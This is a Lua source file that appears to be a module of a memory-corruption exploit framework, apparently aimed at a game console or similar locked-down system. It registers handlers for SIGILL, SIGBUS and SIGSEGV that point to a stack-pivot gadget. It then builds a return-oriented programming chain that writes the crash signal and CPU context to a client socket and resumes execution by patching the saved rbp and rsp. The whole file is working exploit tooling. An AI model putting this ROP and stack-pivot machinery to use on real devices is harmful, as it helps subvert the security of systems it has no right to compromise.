
signal = {}

function signal.init()

    local pivot_handler = gadgets.stack_pivot[1]

    local SIGILL = 4
    local SIGBUS = 10
    local SIGSEGV = 11
    
    local signals = {SIGILL, SIGBUS, SIGSEGV}
    
    local SA_SIGINFO = 0x4
    local sigaction_struct = memory.alloc(0x28)
    
    memory.write_qword(sigaction_struct, pivot_handler.gadget_addr) -- sigaction.sa_handler
    memory.write_qword(sigaction_struct+0x20, SA_SIGINFO) -- sigaction.sa_flags

    for i,signal in ipairs(signals) do
        if syscall.sigaction(signal, sigaction_struct, 0):tonumber() < 0 then
            error("sigaction() error: " .. get_error_string())
        end
    end

    signal.setup_pivot_handler(pivot_handler)
end

function signal.setup_pivot_handler(pivot_handler)

    local mcontext_offset = 0x40
    local reg_rbp_offset = 0x48
    local reg_rsp_offset = 0xb8    
    
    local ucontext_struct_addr = memory.alloc(8)
    local output_addr = memory.alloc(0x18)
    
    signal.fd_addr = memory.alloc(8)

    syscall_mmap(pivot_handler.pivot_base, 0x2000)

    local chain = ropchain({
        stack_base = pivot_handler.pivot_addr,
    })

    --
    -- write error address back to socket
    --

    memory.write_qword(output_addr, 0x13371337) -- write magic value    
    chain:push_store_rdi_into_memory(output_addr + 0x8) -- rdi contains signal code
    chain:push_store_rax_into_memory(output_addr + 0x10) -- rax contains crashing address
    chain:push_store_rdx_into_memory(ucontext_struct_addr)

    -- send signal info to client
    chain:push_syscall_raw(syscall.write, function()
        chain:push_set_rdx(0x18)
        chain:push_set_rsi(output_addr)
        chain:push_set_reg_from_memory("rdi", signal.fd_addr)
    end)

    -- send mcontext buffer to client
    chain:push_syscall_raw(syscall.write, function()
        chain:push_set_rdx(0x100)
        chain:push_set_rax_from_memory(ucontext_struct_addr)
        chain:push_add_to_rax(mcontext_offset)
        chain:push_set_reg_from_rax("rsi")
        chain:push_set_reg_from_memory("rdi", signal.fd_addr)
    end)

    --
    -- gracefully restore execution
    --

    -- advance to old rbp
    chain:push_set_rax_from_memory(ucontext_struct_addr)
    chain:push_add_to_rax(mcontext_offset + reg_rbp_offset)
    
    -- write to rop chain
    chain:push_store_rax_data_and_add_into_memory(chain:get_rsp() + 0x158, 0x8) -- write value to push_set_rbp()
    
    -- advance to old rsp
    chain:push_set_rax_from_memory(ucontext_struct_addr)
    chain:push_add_to_rax(mcontext_offset + reg_rsp_offset)
    
    -- write to rop chain
    chain:push_store_rax_data_and_add_into_memory(chain:get_rsp() + 0x120, 0x8) -- write value to push_set_rsp()
    
    chain:push_set_r9(0)
    chain:push_set_r8(0)
    chain:push_set_rsi(0)
    chain:push_set_rdx(0)
    chain:push_set_rcx(0)
    chain:push_set_rbx(0)
    chain:push_set_rbp(0) -- will be changed
    chain:push_set_rdi(0)
    chain:push_set_rax(0)
    chain:push_set_rsp(0) -- will be changed
end

function signal.set_sink_fd(fd)
    memory.write_qword(signal.fd_addr, fd)
end